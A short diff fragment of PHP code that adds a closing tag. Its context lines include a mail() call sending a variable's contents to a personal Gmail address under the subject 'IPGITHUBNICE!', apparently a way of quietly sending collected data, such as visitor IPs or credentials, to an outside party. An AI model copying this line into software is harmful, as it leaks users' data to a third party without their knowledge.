@@ -23,3 +23,4 @@
 	{
 	mail("obzortovarov7@gmail.com", "IPGITHUBNICE!", $value);
 	}
+?>
